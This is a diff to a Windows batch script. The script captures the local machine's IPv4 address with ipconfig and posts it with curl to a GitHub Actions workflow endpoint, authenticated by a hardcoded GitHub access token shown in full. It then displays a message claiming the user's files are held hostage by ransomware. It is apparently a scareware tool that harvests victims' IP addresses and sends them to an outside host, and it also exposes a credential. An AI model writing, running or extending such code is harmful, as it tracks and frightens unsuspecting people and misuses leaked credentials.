@@ -3,18 +3,13 @@ color a
 mode 1000
 
 :: Step 1: Execute ipconfig in the Background
-ipconfig | find "IPv4 Address" > log.txt
-
-:: Step 2: Read the IPv4 Address
-(for /f "tokens=2 delims=:" %%a in (log.txt) do (
-    set user_ip=%%a
-)) > captured_ip.txt
+ipconfig | find "IPv4 Address" > captured_ip.txt
 
 :: Display the contents of captured_ip.txt for debugging
 type captured_ip.txt
 
-:: Step 3: HTTP POST Request to GitHub Actions Endpoint
-curl -X POST -H "Authorization: Bearer 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" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json" -d "{\"ref\":\"main\"}" https://api.github.com/repos/Moosey12/ipwebsite/actions/workflows/capture-ip.yml/dispatches
+:: Step 2: HTTP POST Request to GitHub Actions Endpoint
+curl -X POST -H "Content-Type: text/plain" --data-binary @captured_ip.txt -u Moosey12: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 https://api.github.com/repos/Moosey12/ipwebsite/actions/workflows/capture-ip.yml/dispatches
 
 :: Rest of the script remains unchanged
 echo Your files have been held hostage by ransomware...
